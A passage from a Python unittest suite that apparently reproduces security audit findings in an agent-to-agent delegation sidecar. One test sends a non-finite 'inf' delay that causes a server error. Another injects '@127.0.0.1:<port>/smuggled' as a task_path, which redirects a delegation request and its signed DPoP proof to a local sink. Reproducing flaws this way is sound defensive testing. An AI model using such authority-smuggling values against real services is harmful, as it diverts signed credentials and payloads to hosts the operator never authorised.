            # Primary booked HTL-TYO-09 (because token was NOT timed-out/revoked yet!) AND backup booked HTL-TYO-09!
            self.assertEqual(len(task_hotel_bookings), 2)

            # --- [CRITICAL-M2-01D] Non-finite string `simulate_primary_zombie_delay_sec: "inf"` -> 500 OverflowError ---
            t_inf = tok_dbl.attenuate(
                issuer_identity=orch_sc.identity,
                delegate_spiffe_id=hotel1_sc.identity.spiffe_id,
                delegate_jkt=hotel1_sc.identity.jkt,
                permissions=perms,
                hop_segment="HotelInf",
            )
            c_inf = t_inf.encode_compact()
            r_inf = httpx.post(
                f"{hotel1_sc.inbound_url}/a2a/task",
                json={"city": "Tokyo", "simulate_primary_zombie_delay_sec": "inf"},
                headers={
                    "Authorization": f"DPoP {c_inf}",
                    "DPoP": create_dpop_proof(orch_sc.identity, "POST", f"{hotel1_sc.inbound_url}/a2a/task", c_inf),
                },
                timeout=5.0,
            )
            self.assertEqual(r_inf.status_code, 500)
        finally:
            for svc in reversed(services_to_stop):
                try:
                    svc.stop()
                except Exception:
                    pass

    def test_08_outbound_proxy_task_path_authority_smuggling(self) -> None:
        ca_alpha = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)

        dir_svc = AgentDirectoryService(resolver, host="127.0.0.1", port=0)
        dir_url = dir_svc.start()
        dir_cli = AgentDirectoryClient(dir_url, resolver)

        smuggled_hits: List[Dict[str, Any]] = []

        def _smuggle_sink(req: HTTPRequestContext) -> Tuple[int, Any, Dict[str, str]]:
            smuggled_hits.append(
                {
                    "path": req.path,
                    "auth": req.header("Authorization"),
                    "dpop": req.header("DPoP"),
                    "body": req.json() if req.body else {},
                }
            )
            return 200, {"sink": True}, {}

        sink_srv = ManagedHTTPService("smuggle-sink", _smuggle_sink, host="127.0.0.1", port=0)
        sink_url = sink_srv.start()
        sink_port = sink_srv.port

        legit_id = ca_alpha.issue_workload("/ns/lineage-alpha/sa/legit-delegate")
        legit_card = AgentCard.sign_and_create(
            identity=legit_id,
            name="legit",
            endpoint="http://127.0.0.1:9",
            return_endpoint="http://127.0.0.1:9",
            skills=["skill.demo"],
        )
        dir_cli.register(legit_card)

        caller_id = ca_alpha.issue_workload("/ns/lineage-alpha/sa/caller-agent")
        sec = "loopback-outbound-smuggle-test-secret"

        captured_req_id: Dict[str, str] = {}

        def _app_handler(req: HTTPRequestContext) -> Tuple[int, Any, Dict[str, str]]:
            req_id = str(req.header("X-LCT-Request-Id", ""))
            captured_req_id["id"] = req_id
            # Pass `@127.0.0.1:<sink_port>/smuggled` as `task_path` to `/v1/proxy/call`!
            r_out = httpx.post(
                f"{sc.outbound_url}/v1/proxy/call",
                headers={"X-LCT-Loopback-Auth": sec},
                json={
                    "action": "delegate_agent",
                    "request_id": req_id,
                    "required_skill": "skill.demo",
                    "task_path": f"@127.0.0.1:{sink_port}/smuggled",
                    "payload": {"hello": "world"},
                },
                timeout=5.0,
            )
            return r_out.status_code, r_out.json(), {}

        app_srv = ManagedHTTPService("caller-app", _app_handler, host="127.0.0.1", port=0)
        app_url = app_srv.start()
        sc = LineageSidecar(
            identity=caller_id,
            trust_resolver=resolver,
            app_upstream_url=app_url,
            loopback_secret=sec,
            directory_client=dir_cli,
            is_tool_server=False,
        )
        in_url, _ = sc.start()
        try:
            gw_id = ca_alpha.issue_workload("/ns/lineage-alpha/sa/gw")
            perms = PermissionLattice.create(tools=["search_flight"], max_calls=2)
            tok = mint_root_token(
                ca_alpha,
                task_id="task-smuggle-outbound",
                sub="user:alice@org-alpha.io",
                sender_jkt=gw_id.jkt,
                first_hop_spiffe_id=caller_id.spiffe_id,
                first_hop_jkt=caller_id.jkt,
                permissions=perms,
            )
            c_tok = tok.encode_compact()
            r = httpx.post(
                f"{in_url}/a2a/task",
                json={},
                headers={
                    "Authorization": f"DPoP {c_tok}",
                    "DPoP": create_dpop_proof(gw_id, "POST", f"{in_url}/a2a/task", c_tok),
                },
            )
            # [MEDIUM-M2-02] Reproduced: unvalidated `task_path` smuggles authority (`http://127.0.0.1:9@127.0.0.1:<sink_port>/smuggled`)
            # redirecting the outbound delegation POST, payload, and signed DPoP proof away from `legit_card.endpoint`!
            self.assertEqual(r.status_code, 200)
            self.assertEqual(len(smuggled_hits), 1)
            self.assertEqual(smuggled_hits[0]["path"], "/smuggled")
            self.assertTrue(str(smuggled_hits[0]["dpop"]).startswith("eyJ"))
            self.assertEqual(smuggled_hits[0]["body"], {"hello": "world"})
        finally:
            sc.stop()
            app_srv.stop()
            sink_srv.stop()
            dir_svc.stop()


if __name__ == "__main__":
    unittest.main(verbosity=2)
